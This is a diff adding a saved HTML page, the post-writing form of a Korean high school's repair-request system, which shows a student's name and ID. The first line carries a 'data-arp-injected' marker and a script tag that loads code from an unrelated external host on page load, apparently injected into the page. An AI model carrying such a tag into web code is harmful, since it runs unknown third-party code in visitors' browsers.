@@ -1,0 +1,72 @@
+<html data-arp-injected="true"><head><script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0"><title>현대청운고등학교</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <style type="text/css">
+    a { text-decoration:none;color:black; }
+    body {font-family:NotokrR;}
+    </style>
+    <title>현대청운고등학교</title>
+    <table width="800" align="center" cellspacing="0" style="border-collapse:collapse;">
+        <tbody><tr>
+            <td background="../1.jpg" height="40" style="border-width:1; border-color:black; border-style:none;" valign="bottom"><font color="white">현대청운고등학교 수리의뢰시스템</font></td>
+        </tr>
+
+    </tbody></table>
+
+    <table width="800" align="center" cellspacing="0" style="border-collapse:collapse;">
+
+        <tbody><tr>
+
+            <td width="40%" style="border-width:1; border-color:black; border-style:none;" valign="top">
+                <form name="form11" method="post">
+    <input type="button" value="첫화면" onclick="location.href='../student.php';" style="font-family:NotokrR;width:80;font-size:14;cursor:hand;">
+    <span style="font-size:15;color:blue">30619 이승준</span></form>
+    <iframe name="m2" width="0" height="0" frameborder="no"></iframe>		</td>
+            <td width="60%" style="font-size:14" valign="top" align="right">
+                <a href="./student.html" class="mn mn-color"><span>[목록보기]</span></a>
+                <a href="./write_s.html" class="mn mn-color"><span style="background-color:#006699;color:white;">[글쓰기]</span></a>
+            </td>
+        </tr>
+
+    </tbody></table>
+    <form name="form1" method="post" onsubmit="return regMember(this);" enctype="multipart/form-data">
+
+    <p>&nbsp;</p>
+    <table cellspacing="0" width="500" align="center">
+        <tbody><tr>
+            <td>
+                <input type="text" name="subject" style="ime-mode:active;font-family:NotokrR;width:100%;height:35;font-size:14;padding-left:7;" placeholder="제목 입력">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <textarea name="content" rows="15" style="ime-mode:active;font-family:NotokrR;width:100%;font-size:14;padding:7;" placeholder="내용 입력"></textarea>
+            </td>
+        </tr>
+    </tbody></table>
+    <br>
+    <table cellspacing="0" width="500" align="center" style="font-size:14">
+        <tbody><tr>
+            <td width="60%">
+                <input type="radio" name="who_to" value="행정실" id="h" style="width:16;height:16;"><label for="h" style="cursor:hand;">행정실</label> &nbsp;&nbsp;
+                <input type="radio" name="who_to" value="정보실" id="j" style="width:16;height:16;"><label for="j" style="cursor:hand;">정보실</label> &nbsp;&nbsp;
+                <input type="radio" name="who_to" value="청운학사" id="c" style="width:16;height:16;"><label for="c" style="cursor:hand;">청운학사</label>
+            </td>
+            <td align="right"><input type="file" name="file" style="font-family:NotokrR;width:100%;height:30;font-size:14;cursor:hand;" placeholder="첨부파일"></td>
+        </tr>
+    </tbody></table>
+
+    <p align="center">
+        <input type="button" value="등록" onclick="func_submit();" style="font-family:NotokrR;font-size:14;width:150;height:30;border-width:1;border-color:gray;" class="btn btn-color">
+        &nbsp;&nbsp;&nbsp;&nbsp;
+        <input type="button" value="취소" onclick="history.back();return false" style="font-family:NotokrR;font-size:14;width:150;height:30;border-width:1;border-color:gray;" class="btn btn-color">
+    </p>
+    </form>
+
+    <iframe name="f2" width="0" height="0" frameborder="no" marginwidth="0" marginheight="0" topmargin="0" scrolling="no"></iframe>
+    <script>
+    function func_submit(){
+        document.form1.target = "f2";
+        document.form1.action = "insert_s.php";
+        document.form1.submit();
+    }
+    </script></body></html>
